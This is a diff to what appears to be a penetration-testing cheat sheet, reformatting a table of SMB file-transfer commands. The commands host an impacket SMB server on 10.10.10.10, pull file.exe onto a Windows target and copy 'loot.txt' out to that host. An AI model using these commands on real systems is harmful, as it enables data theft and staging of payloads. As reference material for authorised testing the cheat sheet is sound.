@@ -27,11 +27,11 @@
 
 ## SMB
 
-|Operation|Command|Platform|
-|---|---|---|
-|Host|`impacket-smbserver -ip 10.10.10.10 -smb2support -username user -password password123 share /tmp/share`|Linux|
-|Download|`copy \\10.10.10.10\share\file.exe C:\Temp\file.exe`|Windows|
-|Upload|`copy C:\Temp\loot.txt \\10.10.10.10\share\loot.txt`|Windows|
+| Operation | Command                                                                                                 | Platform |
+| --------- | ------------------------------------------------------------------------------------------------------- | -------- |
+| Host      | `impacket-smbserver -ip 10.10.10.10 -smb2support -username user -password password123 share /tmp/share` | Linux    |
+| Download  | `copy \\10.10.10.10\share\file.exe C:\Windows\Temp\file.exe`                                            | Windows  |
+| Upload    | `copy C:\Temp\loot.txt \\10.10.10.10\share\loot.txt`                                                    | Windows  |
 
 ---
 
